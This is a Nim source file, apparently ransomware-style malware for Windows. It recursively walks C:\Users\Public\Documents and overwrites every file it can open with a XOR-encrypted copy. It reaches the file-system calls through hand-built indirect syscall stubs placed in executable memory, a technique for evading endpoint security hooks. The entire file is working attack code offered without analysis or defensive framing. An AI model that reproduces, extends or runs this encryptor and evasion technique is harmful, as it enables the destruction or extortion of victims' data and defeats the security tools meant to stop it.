import winim/lean, strformat, os, strutils, winim

const
  targetDir* = r"C:\Users\Public\Documents"
  key* = "secret"

type
  SyscallNtOpenProc = proc (
    FileHandle: ptr HANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: ptr OBJECT_ATTRIBUTES,
    IoStatusBlock: ptr IO_STATUS_BLOCK,
    ShareAccess: ULONG,
    OpenOptions: ULONG
  ): NTSTATUS {.cdecl.}

  SyscallNtQueryDirProc = proc(
    FileHandle: HANDLE,
    Event: HANDLE,
    ApcRoutine: pointer,
    ApcContext: pointer,
    IoStatusBlock: ptr IO_STATUS_BLOCK,
    FileInformation: pointer,
    Length: ULONG,
    FileInformationClass: ULONG,
    ReturnSingleEntry: BOOLEAN,
    FileName: ptr UNICODE_STRING,
    RestartScan: BOOLEAN
  ): NTSTATUS {.cdecl.}

  SyscallNtReadProc = proc(
    FileHandle: HANDLE,
    Event: HANDLE,
    ApcRoutine: pointer,
    ApcContext: pointer,
    IoStatusBlock: ptr IO_STATUS_BLOCK,
    Buffer: pointer,
    Length: uint32,
    ByteOffset: ptr int64,
    Key: ptr uint32
  ): NTSTATUS {.cdecl.}

  SyscallNtWriteProc = proc(
    FileHandle: HANDLE,
    Event: HANDLE,
    ApcRoutine: pointer,
    ApcContext: pointer,
    IoStatusBlock: ptr IO_STATUS_BLOCK,
    Buffer: pointer,
    Length: uint32,
    ByteOffset: ptr int64,
    Key: ptr uint32
  ): NTSTATUS {.cdecl.}

  SyscallNtQueryInformationFile = proc(
    FileHandle: HANDLE,
    IoStatusBlock: ptr IO_STATUS_BLOCK,
    FileInformation: pointer,
    Length: ULONG,
    FileInformationClass: int32
  ): NTSTATUS {.cdecl.}


proc wideLen(w: ptr WCHAR): int =
  var p = w
  var cnt = 0
  while p[] != 0:
    inc cnt
    p = cast[ptr WCHAR](cast[ByteAddress](p) + sizeof(WCHAR))
  return cnt

proc syscallNum(name: cstring): int32 =
  let n = LoadLibraryA("ntdll.dll")
  let procAddr = GetProcAddress(n, name)
  for i in 0..127:
    let p = cast[ptr byte](cast[ByteAddress](procAddr) +% i)
    if p[] == 0xB8'u8:
      let immPtr = cast[ptr int32](cast[ByteAddress](p) +% 1)
      return immPtr[]
  return -1

proc syscallInstr(funcName: pointer): pointer =
  let baseAddr = cast[ByteAddress](funcName)
  for i in 0..31:
    let p1 = cast[ptr byte](baseAddr +% i)
    let p2 = cast[ptr byte](baseAddr +% (i + 1))
    if p1[] == 0x0F'u8 and p2[] == 0x05'u8:
      return p1
  return nil

proc syscallStub(funcName: pointer, syscallNumber: int32): pointer =
  if funcName == nil: return nil
  let sysInstr = syscallInstr(funcName)
  var stub: array[21, byte] = [
    0x4C, 0x8B, 0xD1,
    0xB8, 0x00, 0x00, 0x00, 0x00,
    0x49, 0xBB,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x41, 0xFF, 0xE3
  ]

  let immPtr = cast[ptr int32](addr stub[4])
  immPtr[] = syscallNumber

  let targetPtr = cast[ptr int64](addr stub[10])
  targetPtr[] = cast[int64](cast[ByteAddress](sysInstr))

  let size = stub.len
  let mem = VirtualAlloc(nil, csize(size), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  copyMem(mem, unsafeAddr stub[0], size)
  if mem == nil:
    echo "[-] VirtualAlloc failed!"
    return nil

  return mem

proc syscallGetBufferSize(h: HANDLE): int =
  var iosb: IO_STATUS_BLOCK
  var info: FILE_STANDARD_INFORMATION

  let NtFileSizeNum = syscallNum("NtQueryInformationFile")
  let ntFileSizeStub = syscallStub(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationFile"), NtFileSizeNum)
  if ntFileSizeStub == nil: return -1
  let NtQueryInformationFile = cast[SyscallNtQueryInformationFile](ntFileSizeStub)
  defer: discard VirtualFree(ntFileSizeStub, 0, MEM_RELEASE)

  let status = NtQueryInformationFile(
    h,
    addr iosb,
    addr info,
    sizeof(info).ULONG,
    5
  )

  if status >= 0:
    return info.EndOfFile.QuadPart.int
  return -1

proc encryptBuffer(input: seq[uint8], xorKey: byte): seq[uint8] {.cdecl.} =
  var output = newSeq[uint8](input.len)
  for i in 0..<input.len:
    output[i] = input[i] xor xorKey
  return output

proc syscallMain(ntPath: string) =
  var dirHandle: HANDLE
  var iosb: IO_STATUS_BLOCK

  let folder = newWideCString(ntPath)
  var uniStr: UNICODE_STRING
  uniStr.Buffer = folder
  uniStr.Length = (wideLen(folder) * sizeof(WCHAR)).uint16
  uniStr.MaximumLength = uniStr.Length + sizeof(WCHAR).uint16

  var oa: OBJECT_ATTRIBUTES
  zeroMem(addr oa, sizeof(oa))
  oa.Length = sizeof(OBJECT_ATTRIBUTES).ULONG
  oa.ObjectName = addr uniStr
  oa.Attributes = OBJ_CASE_INSENSITIVE
  oa.RootDirectory = 0.HANDLE

  let ntOpenNum = syscallNum("NtOpenFile")
  let openStub = syscallStub(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenFile"), ntOpenNum)
  if openStub == nil:
    echo "[-] failed to build NtOpenFile stub"
    return
  let NtOpenFile = cast[SyscallNtOpenProc](openStub)
  defer: discard VirtualFree(openStub, 0, MEM_RELEASE)

  zeroMem(addr iosb, sizeof(iosb))

  let desiredAccess = ACCESS_MASK(FILE_LIST_DIRECTORY or FILE_READ_ATTRIBUTES or SYNCHRONIZE)

  let status = NtOpenFile(
    addr dirHandle,
    desiredAccess,
    addr oa,
    addr iosb,
    (FILE_SHARE_READ or FILE_SHARE_WRITE or FILE_SHARE_DELETE).ULONG,
    ULONG(FILE_DIRECTORY_FILE or FILE_SYNCHRONOUS_IO_NONALERT)
  )

  if status < 0:
    echo fmt("[-] NtOpenFile failed with status: 0x{cast[uint32](status):08X}")
    return

  defer: discard CloseHandle(dirHandle)

  let ntQueryNum = syscallNum("NtQueryDirectoryFile")
  let queryStub = syscallStub(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryDirectoryFile"), ntQueryNum)
  if queryStub == nil:
    echo "[-] failed to build NtQueryDirectoryFile stub"
    return
  let NtQueryDirectoryFile = cast[SyscallNtQueryDirProc](queryStub)
  defer: discard VirtualFree(queryStub, 0, MEM_RELEASE)

  var buffer: array[4096, byte]
  var restart = true

  while true:
    zeroMem(addr iosb, sizeof(iosb))
    let qstat = NtQueryDirectoryFile(
      dirHandle,
      cast[HANDLE](nil),
      nil,
      nil,
      addr iosb,
      addr buffer[0],
      ULONG(buffer.len),
      1,
      BOOLEAN(false),
      nil,
      BOOLEAN(restart)
    )

    if qstat < 0: break
    restart = false

    var offset: ULONG = 0
    while true:
      let entry = cast[ptr FILE_DIRECTORY_INFORMATION](addr buffer[offset])
      let nameLenInWchars = (entry.FileNameLength div sizeof(WCHAR)).int
      let fnamePtr = addr entry.FileName[0]
      
      var fname: string
      if nameLenInWchars > 0:
        let reqSize = WideCharToMultiByte(CP_UTF8, 0, fnamePtr, nameLenInWchars.int32, nil, 0, nil, nil)
        if reqSize > 0:
          fname = newString(reqSize)
          discard WideCharToMultiByte(CP_UTF8, 0, fnamePtr, nameLenInWchars.int32, addr fname[0], reqSize, nil, nil)
      
      let cleanName = fname.strip(chars = {'\0'})
      if cleanName != "." and cleanName != "..":
        if (entry.FileAttributes and FILE_ATTRIBUTE_DIRECTORY) != 0:
          echo "[DIR] ", ntPath, "\\", cleanName
          syscallMain(ntPath & "\\" & cleanName)
        else:
          let fullPath = ntPath & "\\" & cleanName
          echo "", fullPath
          let filePath = if fullPath.startsWith(r"\??\"): fullPath[4..^1] else: fullPath
          let fileHandle = CreateFileA(
              filePath,
              GENERIC_READ,
              FILE_SHARE_READ,
              nil,
              OPEN_EXISTING,
              FILE_ATTRIBUTE_NORMAL,
              cast[HANDLE](nil)
            )
          if fileHandle == INVALID_HANDLE_VALUE:
              echo fmt"[-] Failed to open file '{filePath}' with error: {GetLastError()}"
          else:
            let readNum = syscallNum("NtReadFile")
            let readStub = syscallStub(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadFile"), readNum)
            if readStub == nil:
              echo "[-] Failed to build NtReadFile stub"
              discard CloseHandle(fileHandle)
            else:
              let NtReadFile = cast[SyscallNtReadProc](readStub)
              defer: discard VirtualFree(readStub, 0, MEM_RELEASE)
              
              var fileSize = syscallGetBufferSize(fileHandle)
              if fileSize < 0: fileSize = 4096
              var fileContentBuf: seq[byte] = newSeq[byte](fileSize)
              zeroMem(addr iosb, sizeof(iosb))
              let readStatus = NtReadFile(
                  fileHandle, cast[HANDLE](nil), cast[pointer](nil), cast[pointer](nil), 
                  addr iosb, 
                  if fileContentBuf.len > 0: addr fileContentBuf[0] else: nil, fileContentBuf.len.uint32, 
                  cast[ptr int64](nil), cast[ptr uint32](nil)
              ) 

              if readStatus >= 0:
                  let bytesRead = iosb.Information
                  echo fmt("+] Read {bytesRead} bytes.")
                  discard CloseHandle(fileHandle)

                  let writeFileHandle = CreateFileA(
                    filePath.cstring,
                    GENERIC_WRITE,
                    0,
                    nil,
                    CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL,
                    cast[HANDLE](nil)
                  )
                  if writeFileHandle == INVALID_HANDLE_VALUE:
                    echo fmt"[-] Failed to open file for writing with error: {GetLastError()}"
                  else:
                    defer: discard CloseHandle(writeFileHandle)
                    let writeNum = syscallNum("NtWriteFile")
                    let writeStub = syscallStub(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteFile"), writeNum)
                    if writeStub == nil:
                      echo "[-] Failed to build NtWriteFile stub"
                    else:
                      defer: discard VirtualFree(writeStub, 0, MEM_RELEASE)
                      let NtWriteFile = cast[SyscallNtWriteProc](writeStub)

                      zeroMem(addr iosb, sizeof(iosb))
                      let xorBuf = encryptBuffer(fileContentBuf[0 ..< bytesRead.int], key[0].byte)
                      let writeStatus = NtWriteFile(
                        writeFileHandle, cast[HANDLE](nil), nil, nil, addr iosb,
                        if xorBuf.len > 0: addr xorBuf[0] else: nil,
                        xorBuf.len.uint32, cast[ptr int64](nil), nil
                      )
                      if writeStatus >= 0:
                        echo fmt"[+] Wrote {iosb.Information} bytes back to file."
                      else:
                        echo fmt"[-] NtWriteFile failed: 0x{cast[uint32](writeStatus):X}"
              else:
                  echo fmt("[-] NtReadFile failed: 0x{cast[uint32](readStatus):X}")
                  discard CloseHandle(fileHandle)

      if entry.NextEntryOffset == 0: break
      offset += entry.NextEntryOffset

proc getNtPath(path: string): string =
  var fullPath = expandFilename(path)
  if not fullPath.startsWith(r"\??\"):
    fullPath = r"\??\" & fullPath
  return fullPath

when isMainModule:
  let ntPath = getNtPath(targetDir)
  syscallMain(ntPath)